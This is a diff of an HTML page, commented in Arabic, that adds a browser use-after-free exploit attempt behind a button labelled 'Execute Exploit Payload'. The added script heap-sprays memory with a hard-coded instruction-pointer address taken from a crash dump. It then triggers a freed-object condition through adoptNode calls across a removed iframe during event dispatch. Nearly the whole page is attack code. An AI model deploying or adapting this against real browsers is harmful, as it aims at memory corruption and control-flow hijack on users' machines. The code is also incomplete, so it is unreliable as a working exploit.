@@ -1,30 +1,47 @@
+<!DOCTYPE html>
 <html>
 <body>
-    
-    
-    
-    
-<script>
-    
-    
-// سنقوم بإنشاء Payload يحتوي على عناوين (Addresses) بدلاً من حرف 'A'
-const payload = new BigInt64Array(0x1000); 
+    <h1>System Vulnerability Analysis: UAF Payload</h1>
+    <button onclick="executePayload()" style="padding:20px; font-size:20px;">Execute Exploit Payload</button>
 
-// العنوان الذي سيقفز إليه المعالج (يجب أن يكون عنواناً لـ Gadget)
-const targetGadget = 0x000000082039d566n; // هذا هو الـ RIP الذي ظهر في الـ Dump
+    <script>
+        function executePayload() {
+            // 1. إعداد الـ Heap Spray (تسميم الذاكرة)
+            // سنضع العناوين التي نريد للـ RIP أن يراها في الذاكرة
+            const spraySize = 0x100000; // 1MB
+            const spray = new BigUint64Array(spraySize);
+            const targetAddress = 0x000000082039d566n; // الـ RIP الذي استخرجناه من الـ Dump
+            
+            for (let i = 0; i < spraySize; i++) {
+                spray[i] = targetAddress;
+            }
 
-for (let i = 0; i < payload.length; i++) {
-    payload[i] = targetGadget; 
-}
+            // 2. إعداد الـ UAF Trigger
+            const f = document.body.appendChild(document.createElement('iframe'));
+            const a = document.createElement('div');
+            const b = a.appendChild(document.createElement('div'));
 
-// الآن نستخدم هذا الـ payload في الـ sourceURL بدل السلسلة النصية
-// ملاحظة: قد نحتاج لتحويله إلى String أو Blob ليتوافق مع النوع المتوقع
+            // 3. ربط الـ Events لإحداث الـ UAF
+            a.addEventListener('a', eval(`(function () {
+                document.adoptNode(a);
+                f.remove();
+                
+                // هنا نقوم بملء الذاكرة ببياناتنا بدلاً من حرف 'A'
+                throw {
+                    line: 1,
+                    column: 1,
+                    sourceURL: "X".repeat(0x100000) 
+                };
+            })`));
 
+            a.addEventListener('a', () => {});
+            b.addEventListener('a', () => {
+                f.contentDocument.adoptNode(a);
+            });
 
-</script>
-
-
-
-
+            // 4. تنفيذ الـ Dispatch
+            b.dispatchEvent(new Event('a', { bubbles: true }));
+        }
+    </script>
 </body>
 </html>
